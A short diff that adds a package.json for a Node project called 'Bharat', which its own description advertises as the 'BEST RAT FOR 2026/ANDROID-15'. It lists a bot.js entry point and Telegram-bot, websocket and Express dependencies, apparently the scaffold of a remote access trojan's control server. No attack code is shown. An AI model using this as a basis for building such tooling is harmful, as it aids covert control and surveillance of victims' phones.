@@ -1,0 +1,15 @@
+{
+  "name": "Bharat",
+  "version": "1.0.0",
+  "description": "BEST RAT FOR 2026/ANDROID-15",
+  "main": "bot.js",
+  "scripts": {
+    "start": "node bot.js"
+  },
+  "dependencies": {
+    "express": "^4.18.2",
+    "node-telegram-bot-api": "^0.64.0",
+    "uuid": "^9.0.1",
+    "ws": "^8.16.0"
+  }
+}
